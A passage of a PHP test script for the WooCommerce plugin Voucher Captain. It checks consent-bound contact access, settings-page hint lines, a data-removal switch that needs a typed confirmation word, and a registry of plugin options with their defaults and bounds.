preg_match_all( "/^\s*'([a-z_]+)'\s*=>\s*__\(/m", substr( $e17_src, (int) strpos( $e17_src, 'public static function event_labels(): array {' ), 6000 ), $e17_m3 );
$e17_written = array_unique( array_merge( $e17_m1[1], $e17_m2[1], $e17_m3[1], array( 'api_committed', 'api_released', 'api_reserved' ) ) );
$e17_missing = array_values( array_diff( $e17_written, VCAP\API\V1\VoucherService::CORE_EVENTS ) );
check( 'VOUCH-E17-02: CORE_EVENTS lists every event Voucher Captain writes (log() literals, *_EVENT constants, core labels)', count( $e17_written ) > 40 && array() === $e17_missing, implode( ', ', $e17_missing ) );
// VOUCH-WF-15 / F-13 (owner's decision 23.11.2026): contact and consent of a voucher id, off by default (contract 1.5.0).
if ( ! function_exists( 'wp_salt' ) ) {
	function wp_salt( $scheme = 'auth' ) { return 'test-salt-' . $scheme; }
}
$wf15_v                  = new VCAP\Voucher();
$wf15_v->id              = 91;
$wf15_v->recipient_email = 'Gift@Example.test';
$wf15_v->recipient_name  = 'Gerda Gift';
$wf15_v->buyer_email     = 'buyer@example.test';
$wf15_v->buyer_name      = 'Bob Buyer';
$wf15_log                = array();
$wf15_fail               = false;
$wf15_svc                = new VCAP\API\V1\ContactService(
	static fn( int $id ) => 91 === $id ? $wf15_v : null,
	static function ( int $id ) use ( &$wf15_log ): array {
		return array_values( array_filter( $wf15_log, static fn( $r ) => $r['voucher_id'] === $id ) );
	},
	static function ( int $id, string $event, string $note ) use ( &$wf15_log, &$wf15_fail ): bool {
		if ( $wf15_fail ) {
			return false;
		}
		$wf15_log[] = array( 'voucher_id' => $id, 'event' => $event, 'note' => $note, 'created_at' => '2026-11-23 10:0' . count( $wf15_log ) . ':00' );
		return true;
	}
);
$wf15_allow = static fn() => true;
$wf15_off   = $wf15_svc->contact( 91, 'review_invitation' );
check( 'VOUCH-WF-15: off by default – contact() answers vcap_contact_disabled (403) and writes nothing', ! VCAP\API\V1\ContactService::enabled() && $wf15_off instanceof WP_Error && 'vcap_contact_disabled' === $wf15_off->get_error_code() && array() === $wf15_log );
$wf15_rec = $wf15_svc->record_consent( 91, 'review_invitation', array( 'role' => 'recipient', 'source' => 'form-captain', 'text' => 'review-optin-v1' ) );
$wf15_bad = array(
	$wf15_svc->record_consent( 91, 'Review', array( 'source' => 'x', 'text' => 'y' ) ),
	$wf15_svc->record_consent( 91, 'review_invitation', array( 'role' => 'friend', 'source' => 'x', 'text' => 'y' ) ),
	$wf15_svc->record_consent( 91, 'review_invitation', array( 'source' => '', 'text' => 'y' ) ),
	$wf15_svc->record_consent( 91, 'review_invitation', array( 'source' => 'x', 'text' => '' ) ),
);
$wf15_unk = $wf15_svc->record_consent( 92, 'review_invitation', array( 'source' => 'x', 'text' => 'y' ) );
check( 'VOUCH-WF-15: record_consent() works while the read function is off; invalid purpose/role/source/text and unknown vouchers are refused', true === $wf15_rec && 1 === count( $wf15_log ) && 4 === count( array_filter( $wf15_bad, static fn( $e ) => $e instanceof WP_Error && 'vcap_contact_invalid' === $e->get_error_code() ) ) && $wf15_unk instanceof WP_Error && 'vcap_unknown_voucher' === $wf15_unk->get_error_code() );
check( 'VOUCH-WF-15: the consent entry is a core event and stores a hash of the address, never the address', 'contact_consent' === $wf15_log[0]['event'] && ! str_contains( strtolower( $wf15_log[0]['note'] ), 'gift@example' ) && str_contains( $wf15_log[0]['note'], 'purpose=review_invitation' ) && str_contains( $wf15_log[0]['note'], 'address=' ) && in_array( 'contact_consent', VCAP\API\V1\VoucherService::CORE_EVENTS, true ) && ! VCAP\API\V1\VoucherService::connector_event( 'contact_consent' ) );
$GLOBALS['vcap_test_options'][ VCAP\API\V1\ContactService::OPTION_ENABLED ] = 'yes';
$wf15_deny = $wf15_svc->contact( 91, 'review_invitation' );
add_filter( 'vcap_contact_read_allowed', $wf15_allow );
$wf15_read = $wf15_svc->contact( 91, 'review_invitation' );
check( 'VOUCH-WF-15: switched on, a caller without rights is refused (vcap_contact_not_allowed); an allowed caller gets the documented keys with the consenting recipient', $wf15_deny instanceof WP_Error && 'vcap_contact_not_allowed' === $wf15_deny->get_error_code() && is_array( $wf15_read ) && VCAP\API\V1\ContactService::CONTACT_KEYS === array_keys( $wf15_read ) && 'gift@example.test' === $wf15_read['email'] && 'Gerda Gift' === $wf15_read['name'] && 'recipient' === $wf15_read['role'] && 'form-captain' === $wf15_read['consent']['source'] && 'review-optin-v1' === $wf15_read['consent']['text'] );
check( 'VOUCH-WF-15: every read is in the history (contact_read, purpose and user, no address)', 'contact_read' === ( end( $wf15_log )['event'] ?? '' ) && str_contains( end( $wf15_log )['note'], 'purpose=review_invitation' ) && ! str_contains( end( $wf15_log )['note'], '@' ) );
$wf15_other = $wf15_svc->contact( 91, 'newsletter' );
$wf15_inval = $wf15_svc->contact( 91, 'x' );
check( 'VOUCH-WF-15: a consent counts only for its own purpose (vcap_contact_no_consent); an invalid purpose is vcap_contact_invalid', $wf15_other instanceof WP_Error && 'vcap_contact_no_consent' === $wf15_other->get_error_code() && $wf15_inval instanceof WP_Error && 'vcap_contact_invalid' === $wf15_inval->get_error_code() );
$wf15_v->recipient_email = 'new@example.test';
$wf15_moved = $wf15_svc->contact( 91, 'review_invitation' );
$wf15_v->recipient_email = '';
$wf15_erased = $wf15_svc->contact( 91, 'review_invitation' );
$wf15_v->recipient_email = 'gift@example.test';
check( 'VOUCH-WF-15: a consent is bound to its address – after a correction or erasure of the address it no longer counts', $wf15_moved instanceof WP_Error && 'vcap_contact_no_consent' === $wf15_moved->get_error_code() && $wf15_erased instanceof WP_Error && 'vcap_contact_no_consent' === $wf15_erased->get_error_code() && is_array( $wf15_svc->contact( 91, 'review_invitation' ) ) );
$wf15_opt = static fn( $out, $email ) => 'gift@example.test' === $email;
add_filter( 'vcap_contact_opted_out', $wf15_opt, 10, 2 );
$wf15_opted = $wf15_svc->contact( 91, 'review_invitation' );
remove_filter( 'vcap_contact_opted_out', $wf15_opt );
$wf15_wd    = $wf15_svc->withdraw_consent( 91, 'review_invitation', 'unsubscribe-link' );
$wf15_after = $wf15_svc->contact( 91, 'review_invitation' );
check( 'VOUCH-WF-15: the opt-out filter refuses an address; a withdrawal wins over the earlier consent', $wf15_opted instanceof WP_Error && 'vcap_contact_opted_out' === $wf15_opted->get_error_code() && true === $wf15_wd && $wf15_after instanceof WP_Error && 'vcap_contact_no_consent' === $wf15_after->get_error_code() && null === $wf15_svc->consent( 91, 'review_invitation' ) );
$wf15_svc->record_consent( 91, 'review_invitation', array( 'role' => 'buyer', 'source' => 'checkout', 'text' => 'v2' ) );
$wf15_buyer = $wf15_svc->contact( 91, 'review_invitation' );
$wf15_fail  = true;
$wf15_lf    = $wf15_svc->record_consent( 91, 'review_invitation', array( 'source' => 'x', 'text' => 'y' ) );
$wf15_fail  = false;
check( 'VOUCH-WF-15: a new consent after a withdrawal counts again (here by the buyer); a failed history write is reported', is_array( $wf15_buyer ) && 'buyer' === $wf15_buyer['role'] && 'buyer@example.test' === $wf15_buyer['email'] && $wf15_lf instanceof WP_Error && 'vcap_log_failed' === $wf15_lf->get_error_code() );
remove_filter( 'vcap_contact_read_allowed', $wf15_allow );
unset( $GLOBALS['vcap_test_options'][ VCAP\API\V1\ContactService::OPTION_ENABLED ] );
$wf15_fields = VCAP\API\V1\ContactService::settings_fields( array(), 'api' );
check( 'VOUCH-WF-15: the switch is in "Integrations (API)" with default "no"; functions and contract 1.5.0 are documented', 1 === count( array_filter( $wf15_fields, static fn( $f ) => VCAP\API\V1\ContactService::OPTION_ENABLED === ( $f['id'] ?? '' ) && 'checkbox' === $f['type'] && 'no' === $f['default'] ) ) && array() === VCAP\API\V1\ContactService::settings_fields( array(), 'codes' ) && function_exists( 'vcap_read_voucher_contact' ) && function_exists( 'vcap_record_contact_consent' ) && function_exists( 'vcap_withdraw_contact_consent' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), '### Contact and consent (since 1.3.0, contract 1.5.0)' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'CONNECTORS.md' ), '| 1.5.0 | 1.3.0 | contact and consent' ) );
// SET-VC-07 (owner's decision S1, 23.11.2026): hint lines on add-on functions – text only, replaceable, hideable.
if ( ! function_exists( 'wp_nonce_url' ) ) {
	function wp_nonce_url( $url, $action = -1 ) { return $url . '&_wpnonce=test'; }
}
$s7_fields = VCAP\Admin\ProHints::append( array( array( 'id' => 'vcap_x', 'type' => 'text' ) ), 'delivery' );
$s7_lines  = array_values( array_filter( $s7_fields, static fn( $f ) => VCAP\Admin\ProHints::FIELD_TYPE === ( $f['type'] ?? '' ) ) );
check( 'SET-VC-07: a section gets one block "Extensions" with its hint lines after its own fields (Delivery: text messages, wallet)', 'vcap_x' === $s7_fields[0]['id'] && 'title' === $s7_fields[1]['type'] && 'sectionend' === end( $s7_fields )['type'] && array( 'vcap_hint_sms_delivery', 'vcap_hint_wallet_passes' ) === array_column( $s7_lines, 'id' ) && array( false, false ) === array_column( $s7_lines, 'is_option' ) );
$s7_repl = VCAP\Admin\ProHints::append( array( array( 'id' => 'vcap_pro_sms', 'type' => 'text', 'replaces' => 'sms_delivery' ) ), 'delivery' );
$s7_both = VCAP\Admin\ProHints::append( array( array( 'id' => 'a', 'type' => 'text', 'replaces' => array( 'sms_delivery', 'wallet_passes' ) ) ), 'delivery' );
check( 'SET-VC-07: a field of the add-on with replaces => id removes its line; with all lines replaced no block remains', array( 'vcap_hint_wallet_passes' ) === array_column( array_filter( $s7_repl, static fn( $f ) => VCAP\Admin\ProHints::FIELD_TYPE === ( $f['type'] ?? '' ) ), 'id' ) && 1 === count( $s7_both ) );
check( 'SET-VC-07: General has the own-brand line, a section without listed functions gets no block', array( 'vcap_hint_white_label' ) === array_column( array_filter( VCAP\Admin\ProHints::append( array(), '' ), static fn( $f ) => VCAP\Admin\ProHints::FIELD_TYPE === ( $f['type'] ?? '' ) ), 'id' ) && array() === VCAP\Admin\ProHints::append( array(), 'codes' ) );
$s7_hide = static fn() => true;
add_filter( 'vcap_pro_hints_hidden', $s7_hide );
$s7_hidden = VCAP\Admin\ProHints::append( array(), 'delivery' );
remove_filter( 'vcap_pro_hints_hidden', $s7_hide );
check( 'SET-VC-07: hidden for the user, no line is shown', array() === $s7_hidden );
ob_start();
VCAP\Admin\ProHints::render( array_merge( $s7_lines[0], array( 'link' => 'https://example.test/pro' ) ) );
$s7_html = (string) ob_get_clean();
check( 'SET-VC-07: a line renders title, "Pro" mark and text – no input, select, textarea, button or disabled control', str_contains( $s7_html, 'Text messages' ) && str_contains( $s7_html, '>Pro<' ) && ! preg_match( '/<(input|select|textarea|button)\b|disabled/i', $s7_html ) && str_contains( $s7_html, 'https://example.test/pro' ) );
$s7_extra = static fn( $h ) => array_merge( $h, array( array( 'id' => 'evil', 'section' => 'codes', 'title' => 'X', 'text' => 'Y', 'link' => 'http://plain.test' ), array( 'id' => 'empty', 'section' => 'codes', 'title' => 'X', 'text' => '' ), array( 'id' => 'ok', 'section' => 'codes', 'title' => '<b>T</b>', 'text' => 'Z' ) ) );
add_filter( 'vcap_settings_hints', $s7_extra );
$s7_ids = array_column( VCAP\Admin\ProHints::hints(), 'title', 'id' );
remove_filter( 'vcap_settings_hints', $s7_extra );
check( 'SET-VC-07: vcap_settings_hints adds lines; a non-https link or an empty text drops the line, tags are stripped', 'T' === ( $s7_ids['ok'] ?? '' ) && ! isset( $s7_ids['evil'] ) && ! isset( $s7_ids['empty'] ) && isset( $s7_ids['white_label'] ) );
$s7_doc = (string) file_get_contents( VCAP_PATH . 'docs/FREE-PREMIUM.md' );
check( 'SET-VC-07: FREE-PREMIUM.md rule 3 allows the hint lines (decision S1) and still forbids license code', str_contains( $s7_doc, 'Entscheidung S1 vom 23.11.2026' ) && str_contains( $s7_doc, 'Kein Lizenz- oder Update-Code im Kern' ) );
// SET-VC-S10 (owner's decision S10, common standard of all Captain plugins): data is kept unless switched on with a typed word.
if ( ! class_exists( 'WC_Admin_Settings' ) ) {
	class WC_Admin_Settings { public static array $errors = array(); public static function add_error( $text ) { self::$errors[] = $text; } }
}
$s10_opt = VCAP\Admin\DataRemoval::OPTION;
unset( $GLOBALS['vcap_test_options'][ $s10_opt ] );
WC_Admin_Settings::$errors = array();
$s10_words = array_map( array( VCAP\Admin\DataRemoval::class, 'is_confirmation' ), array( 'LÖSCHEN', 'löschen', ' Loeschen ', 'delete', 'Löschen!', 'ja', '', null ) );
check( 'SET-VC-S10: LÖSCHEN, LOESCHEN and DELETE count in any letter case (spaces trimmed); other text does not', array( true, true, true, true, false, false, false, false ) === $s10_words );
$s10_no_word = VCAP\Admin\DataRemoval::sanitize( 'yes', '' );
$s10_errors  = count( WC_Admin_Settings::$errors );
$s10_wrong   = VCAP\Admin\DataRemoval::sanitize( 'yes', 'ja' );
$s10_ok      = VCAP\Admin\DataRemoval::sanitize( 'yes', 'löschen' );
check( 'SET-VC-S10: switching on without (or with a wrong) word keeps "no" and shows an error; with the word it is "yes"', 'no' === $s10_no_word && 1 === $s10_errors && 'no' === $s10_wrong && 'yes' === $s10_ok );
$GLOBALS['vcap_test_options'][ $s10_opt ] = 'yes';
WC_Admin_Settings::$errors = array();
check( 'SET-VC-S10: when already on, saving other fields needs no word; switching off needs none either', 'yes' === VCAP\Admin\DataRemoval::sanitize( 'yes', '' ) && 'no' === VCAP\Admin\DataRemoval::sanitize( 'no', '' ) && 'no' === VCAP\Admin\DataRemoval::sanitize( 'garbage', '' ) && array() === WC_Admin_Settings::$errors );
unset( $GLOBALS['vcap_test_options'][ $s10_opt ] );
$s10_fields = VCAP\Admin\DataRemoval::fields( 'desc' );
ob_start();
VCAP\Admin\DataRemoval::render( $s10_fields[1] );
$s10_html = (string) ob_get_clean();
check( 'SET-VC-S10: checkbox "Remove all data when the plugin is deleted" (default no, option name unchanged) and a confirmation field that is not stored', 'vcap_delete_on_uninstall' === $s10_fields[0]['id'] && 'Remove all data when the plugin is deleted' === $s10_fields[0]['title'] && 'no' === $s10_fields[0]['default'] && false === $s10_fields[1]['is_option'] && str_contains( $s10_html, 'name="' . VCAP\Admin\DataRemoval::CONFIRM_FIELD . '" value=""' ) && str_contains( $s10_html, 'LÖSCHEN' ) );
$s10_uninst = (string) file_get_contents( VCAP_PATH . 'uninstall.php' );
$s10_jobs   = strpos( $s10_uninst, "\tvcap_uninstall_jobs();" );
check( 'SET-VC-S10: uninstall removes the scheduled jobs on every uninstall, before the "keep data" return', false !== $s10_jobs && $s10_jobs < strpos( $s10_uninst, 'if ( ! $delete_data )' ) && str_contains( $s10_uninst, "as_unschedule_all_actions( 'vcap_daily_maintenance' );" ) );
check( 'SET-VC-S10: WP-CLI "wp vcap data-removal on" needs --confirm with the word', method_exists( VCAP\CLI\Command::class, 'data_removal' ) && str_contains( (string) ( new ReflectionMethod( VCAP\CLI\Command::class, 'data_removal' ) )->getDocComment(), '@subcommand data-removal' ) );
$e17_main = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
$e17_apim = (string) file_get_contents( VCAP_PATH . 'API.md' );
$e17_conn = (string) file_get_contents( VCAP_PATH . 'CONNECTORS.md' );
$e17_doc  = array_filter( array( 'voucher', 'voucher_by_code', 'log_event', 'connector_event', 'admin_url', 'line_snapshot' ), static fn( $m ) => ! method_exists( VCAP\API\V1\VoucherService::class, $m ) || ! str_contains( (string) ( new ReflectionMethod( VCAP\API\V1\VoucherService::class, $m ) )->getDocComment(), '@since 1.3.0 (contract 1.4.0)' ) || ! str_contains( $e17_apim, $m . '(' ) );
check( 'VOUCH-E17-02: the six methods carry @since (contract 1.4.0), are documented in API.md → "Connector access"; contract 1.4.0 in the main file and CONNECTORS.md', array() === $e17_doc && 1 === preg_match( "/define\( 'VCAP_CONTRACT_VERSION', '(1\.\d+\.\d+)' \);/", $e17_main, $e17_cv ) && version_compare( $e17_cv[1], '1.4.0', '>=' ) && str_contains( $e17_apim, '### Connector access (since 1.3.0, contract 1.4.0)' ) && str_contains( $e17_conn, '| 1.4.0 | 1.3.0 | connector access' ), implode( ', ', $e17_doc ) );

// VOUCH-WF-14: the six lifecycle actions without an "after COMMIT" note now go through Db::action() as well.
$wf14_hooks   = array( 'vcap_vouchers_issued', 'vcap_voucher_issued_standalone', 'vcap_voucher_delivered', 'vcap_voucher_delivery_given_up', 'vcap_voucher_bounced', 'vcap_voucher_reissued' );
$wf14_src     = (string) file_get_contents( VCAP_PATH . 'src/Issuer.php' ) . file_get_contents( VCAP_PATH . 'src/Delivery.php' ) . file_get_contents( VCAP_PATH . 'src/Reissue.php' );
$wf14_doc     = (string) file_get_contents( VCAP_PATH . 'docs/HOOKS.md' );
$wf14_missing = array_values( array_filter( $wf14_hooks, static fn( $h ) => str_contains( $wf14_src, "do_action( '{$h}'" ) || ! str_contains( $wf14_src, "Db::action( '{$h}'" ) || ! preg_match( '/^\| `' . preg_quote( $h, '/' ) . '` \|[^\n]*after COMMIT/m', $wf14_doc ) ) );
check( 'VOUCH-WF-14: the six issue/delivery/bounce/reissue actions fire through Db::action() (after COMMIT inside a transaction) and docs/HOOKS.md says so', array() === $wf14_missing, implode( ', ', $wf14_missing ) );

// SET-VC-01: settings register – one source for default, type, bounds, section, legal weight, export, secret.
echo "SET-VC-01 settings register\n";
$sr_all      = VCAP\SettingsRegistry::all();
$sr_internal = VCAP\SettingsRegistry::internal();
// Constants whose value is an option name ("vcap_…"), per short class name, to resolve get_option( Class::CONST ).
$sr_consts = array();
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( VCAP_PATH . 'src', FilesystemIterator::SKIP_DOTS ) ) as $sr_file ) {
	$sr_php = (string) file_get_contents( (string) $sr_file );
	if ( preg_match( '/^(?:final\s+|abstract\s+)?(?:class|trait|interface)\s+(\w+)/m', $sr_php, $sr_cm ) && preg_match_all( "/const\s+([A-Z0-9_]+)\s*=\s*'(vcap_[a-z0-9_]*)'\s*;/", $sr_php, $sr_cc, PREG_SET_ORDER ) ) {
		foreach ( $sr_cc as $sr_c ) {
			$sr_consts[ $sr_cm[1] ][ $sr_c[1] ] = $sr_c[2];
		}
	}
}
/*
 * Option reads in PHP code that are neither a registered setting nor internal state: get_option(), get_site_option(),
 * Settings::value() and settings->get()/yes() with a literal "vcap_…" name or a class constant holding one; a name
 * followed by "." is a prefix ("vcap_reversal_" . $id) and must be an internal prefix.
 */
$sr_unknown = static function ( string $php, string $class ) use ( $sr_consts ): array {
	$out = array();
	preg_match_all( "/(?:\bget_option|\bget_site_option|Settings::value|settings(?:\(\))?->(?:get|yes)|\\\$this->(?:get|yes))\(\s*(?:'(vcap_[a-z0-9_]*)'|(?:\\\\?[A-Za-z_\\\\]*\\\\)?\b(self|static|[A-Z]\w*)::([A-Z0-9_]+))\s*([.,)])/", $php, $sr_m, PREG_SET_ORDER );
	foreach ( $sr_m as $m ) {
		$name = '' !== $m[1] ? $m[1] : ( $sr_consts[ in_array( $m[2], array( 'self', 'static' ), true ) ? $class : $m[2] ][ $m[3] ] ?? '' );
		if ( '' === $name ) {
			continue; // Not an option name of this plugin (e.g. woocommerce_currency).
		}
		$known = '.' === $m[4] ? VCAP\SettingsRegistry::is_internal( $name . 'x' ) : ( VCAP\SettingsRegistry::has( $name ) || VCAP\SettingsRegistry::is_internal( $name ) );
		if ( ! $known ) {
			$out[] = $name . ( '.' === $m[4] ? '…' : '' );
		}
	}
	return $out;
};
$sr_found = array();
$sr_files = array( VCAP_PATH . 'uninstall.php', VCAP_PATH . 'voucher-captain.php' );
foreach ( array( 'src', 'templates', 'config' ) as $sr_dir ) {
	foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( VCAP_PATH . $sr_dir, FilesystemIterator::SKIP_DOTS ) ) as $sr_file ) {
		if ( str_ends_with( (string) $sr_file, '.php' ) ) {
			$sr_files[] = (string) $sr_file;
		}
	}
}
foreach ( $sr_files as $sr_file ) {
	$sr_php   = (string) file_get_contents( $sr_file );
	$sr_class = preg_match( '/^(?:final\s+|abstract\s+)?(?:class|trait)\s+(\w+)/m', $sr_php, $sr_cm ) ? $sr_cm[1] : '';
	foreach ( $sr_unknown( $sr_php, $sr_class ) as $sr_name ) {
		$sr_found[] = $sr_name . ' (' . str_replace( VCAP_PATH, '', $sr_file ) . ')';
	}
}
check( 'SET-VC-01: every vcap_ option the code reads is in the settings register or listed as internal state', array() === $sr_found, implode( ', ', array_unique( $sr_found ) ) );
$sr_probe = $sr_unknown( "get_option( 'vcap_not_registered', '' ); get_option( 'vcap_unknown_prefix_' . \$id ); get_option( 'vcap_attach_pdf' ); Settings::value( 'vcap_code_length' ); get_option( 'vcap_reversal_' . \$id ); get_option( Install::OPTION_DB_VERSION ); get_option( \\VCAP\\PaymentVouchers::OPTION ); get_option( 'woocommerce_currency' ); get_option( 'vcap_mpv_after_tax_x' );", '' );
check( 'SET-VC-01: the check fails for an unregistered option (literal, prefix, constant) and passes for settings and internal state', array( 'vcap_not_registered', 'vcap_unknown_prefix_…', 'vcap_mpv_after_tax_x' ) === $sr_probe && array( 'vcap_counter_till_x' ) === $sr_unknown( "get_option( self::TILL_AMOUNT ); get_option( 'vcap_counter_till_x' );", 'Counter' ) && array() === $sr_unknown( 'get_option( self::FAILED_LOOKUPS );', 'Counter' ),implode( ', ', $sr_probe ) );
$sr_fielded = array_filter( $sr_all, static fn( $e ) => VCAP\SettingsRegistry::HIDDEN !== $e['section'] );
check( 'SET-VC-01: at least the 91 original options are registered, every one but the 2 secrets with a field, plus 4 user settings; settings and internal state do not overlap', count( $sr_all ) >= 91 && count( $sr_all ) - 2 === count( $sr_fielded ) && array( 'vcap_secret', 'vcap_customer_key_secret' ) === VCAP\SettingsRegistry::with( 'secret' ) && array() === array_filter( array_keys( $sr_all ), static fn( $k ) => VCAP\SettingsRegistry::is_internal( $k ) ) && array( VCAP\Counter::META_AMOUNT, VCAP\Counter::META_COUNT, VCAP\Counter::META_LOCATION, VCAP\Admin\ProHints::USER_META ) === array_keys( VCAP\SettingsRegistry::user_meta() ), (string) count( $sr_all ) );
check( 'SET-VC-01: secrets are never exported; the data removal switch and the support log are not exported either; selects list their choices', array() === array_intersect( VCAP\SettingsRegistry::with( 'secret' ), VCAP\SettingsRegistry::with( 'export' ) ) && ! in_array( 'vcap_delete_on_uninstall', VCAP\SettingsRegistry::with( 'export' ), true ) && ! in_array( VCAP\Logger::VERBOSE_OPTION, VCAP\SettingsRegistry::with( 'export' ), true ) && array() === array_filter( $sr_all, static fn( $e ) => 'select' === $e['type'] && ( empty( $e['choices'] ) || ( '' !== $e['default'] && ! in_array( (string) $e['default'], $e['choices'], true ) ) ) ) );
// Defaults are those of 1.2.0 (formerly Settings::DEFAULTS) – a shop that never saved a setting behaves as before.
$sr_def = VCAP\Settings::defaults();
check( 'SET-VC-01: defaults are unchanged (codes, delivery, counter, links, DATEV, commands; fresh installs: PDF limit 20, payment after tax, delivery date)', array( 'processing', 'completed' ) === $sr_def['vcap_issue_statuses'] && 12 === $sr_def['vcap_code_length'] && 'alnum_upper' === $sr_def['vcap_code_charset'] && 90 === $sr_def['vcap_download_link_days'] && 8 === $sr_def['vcap_delivery_hour'] && 50 === $sr_def['vcap_bundle_pdf_limit'] && 'auto' === $sr_def[ VCAP\Counter::REQUIRE_RECEIPT ] && '' === $sr_def[ VCAP\Counter::LOCATIONS ] && 'gutschein' === $sr_def['vcap_coupon_link_param'] && 0 === $sr_def['vcap_expiry_reminder_days'] && 20 === VCAP\SettingsRegistry::fresh_default( 'vcap_bundle_pdf_limit' ) && 'yes' === VCAP\SettingsRegistry::fresh_default( VCAP\PaymentVouchers::OPTION ) && 'no' === $sr_def[ VCAP\PaymentVouchers::OPTION ] && 'yes' === VCAP\SettingsRegistry::fresh_default( 'vcap_new_product_delivery' ) && '0101' === $sr_def[ VCAP\DatevExport::OPTION_FY_START ] && '50' === $sr_def[ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'per_day' ) ] );
$GLOBALS['vcap_test_options']['vcap_delivery_hour'] = '30';
check( 'SET-VC-01: Settings::get() returns a saved value unchanged (also one outside the bounds) and the register default when nothing is saved', '30' === ( new VCAP\Settings() )->get( 'vcap_delivery_hour' ) && 365 === ( new VCAP\Settings() )->get( 'vcap_default_expiry_days' ) && 365 === VCAP\Settings::value( 'vcap_default_expiry_days' ) && null === ( new VCAP\Settings() )->get( 'vcap_no_such_setting' ) );
unset( $GLOBALS['vcap_test_options']['vcap_delivery_hour'] );
// Fields: every option field of a core section is registered for that section, with the register's default and bounds.
if ( ! function_exists( 'wc_get_order_statuses' ) ) {
	function wc_get_order_statuses() { return array( 'wc-processing' => 'Processing', 'wc-completed' => 'Completed' ); }
}
$sr_settings = new VCAP\Settings();
add_filter( 'vcap_settings_partner_active', static fn() => true ); // SET-VC-33: partner rules are shown while the partner is active.
add_filter( 'vcap_setting_vcap_show_datev', static fn() => 'yes' ); // SET-VC-20: the DATEV block is shown on request.
$sr_bad      = array();
$sr_seen     = array();
foreach ( array_keys( $sr_settings->section_list() ) as $sr_sec ) {
	$sr_fields = $sr_settings->fields( (string) $sr_sec );
	if ( 'api' === $sr_sec ) {
		$sr_fields = VCAP\API\V1\ContactService::settings_fields( VCAP\API\V1\CommandService::settings_fields( $sr_fields, 'api' ), 'api' );
	}
	foreach ( $sr_fields as $sr_f ) {
		$sr_id = (string) ( $sr_f['id'] ?? '' );
		if ( in_array( $sr_f['type'] ?? '', array( 'title', 'sectionend' ), true ) || false === ( $sr_f['is_option'] ?? true ) ) {
			continue;
		}
		$sr_e = VCAP\SettingsRegistry::get( $sr_id );
		if ( null === $sr_e || (string) $sr_sec !== $sr_e['section'] ) {
			$sr_bad[] = $sr_id . ' (section)';
			continue;
		}
		$sr_seen[] = $sr_id;
		if ( 'vcap_default_expiry_rule' !== $sr_id && (string) wp_json_encode( $sr_e['default'] ) !== (string) wp_json_encode( $sr_f['default'] ) && ! ( 'vcap_expiry_reminder_days' === $sr_id && '0' === $sr_f['default'] ) ) {
			$sr_bad[] = $sr_id . ' (default)';
		}
		if ( 'number' === ( $sr_f['type'] ?? '' ) && ( ! in_array( $sr_e['type'], array( 'int', 'decimal' ), true ) || null === $sr_e['min'] || ( $sr_f['custom_attributes']['min'] ?? null ) !== $sr_e['min'] || ( $sr_f['custom_attributes']['max'] ?? null ) !== $sr_e['max'] ) ) {
			$sr_bad[] = $sr_id . ' (bounds)';
		}
	}
}
unset( $GLOBALS['vcap_test_filters']['vcap_settings_partner_active'], $GLOBALS['vcap_test_filters']['vcap_setting_vcap_show_datev'] );
$sr_missing = array_diff( array_keys( $sr_fielded ), $sr_seen );
check( 'SET-VC-01: each option field is registered for its section with the register default and min/max; each registered setting with a section has a field there', array() === $sr_bad && array() === $sr_missing, implode( ', ', array_merge( $sr_bad, $sr_missing ) ) );
check( 'SET-VC-01: field() puts min and max before step, keeps a default the field computes at runtime and leaves unregistered fields alone', array( 'min' => 0, 'max' => 23, 'step' => 1 ) === VCAP\SettingsRegistry::field( 'vcap_delivery_hour', array( 'type' => 'number', 'custom_attributes' => array( 'step' => 1 ) ) )['custom_attributes'] && 'days' === VCAP\SettingsRegistry::field( 'vcap_default_expiry_rule', array( 'type' => 'select', 'default' => 'days' ) )['default'] && array( 'id' => 'vcap_addon_x', 'type' => 'number' ) === VCAP\SettingsRegistry::field( 'vcap_addon_x', array( 'type' => 'number' ) ) );
// Server-side check of numbers (min/max of the register) when the settings are saved.
$sr_san = static fn( $v, $k ) => VCAP\SettingsRegistry::sanitize_option( $v, array( 'id' => $k ) );
check(
	'SET-VC-01: numbers are checked on the server – out of range is set to the bound, text or empty keeps the stored value (null), valid input is stored as entered',
	'23' === $sr_san( '30', 'vcap_delivery_hour' ) && '0' === $sr_san( '-1', 'vcap_delivery_hour' ) && '8' === $sr_san( ' 8 ', 'vcap_delivery_hour' ) && null === $sr_san( 'abc', 'vcap_delivery_hour' ) && null === $sr_san( '', 'vcap_delivery_hour' )
		&& '8' === $sr_san( '3', 'vcap_code_length' ) && '40' === $sr_san( '99', 'vcap_code_length' ) && '12' === $sr_san( '12.4', 'vcap_code_length' ) && '1440' === $sr_san( '5000', 'vcap_redemption_ttl' ) && '1' === $sr_san( '0', 'vcap_redemption_ttl' )
		&& '10.50' === $sr_san( '10.50', 'vcap_custom_max_default' ) && '0' === $sr_san( '-5', 'vcap_customer_daily_limit' ) && '' === $sr_san( '', 'vcap_referral_min_spend' ) && '9' === $sr_san( '12', VCAP\DatevExport::OPTION_LENGTH )
		&& '50' === $sr_san( '80', VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'per_day' ) ) && 'B&B' === $sr_san( 'B&B', 'vcap_code_prefix' ) && null === $sr_san( null, 'vcap_hold_hours' ) && 'x' === $sr_san( 'x', 'vcap_addon_unknown' )
);
$sr_numbers = array_keys( array_filter( $sr_all, static fn( $e ) => in_array( $e['type'], array( 'int', 'decimal' ), true ) ) );
$sr_hook    = static fn( string $k ): string => 'woocommerce_admin_settings_sanitize_option_' . $k;
$sr_before  = $GLOBALS['vcap_test_filters'] ?? array();
VCAP\SettingsRegistry::hook_number_checks();
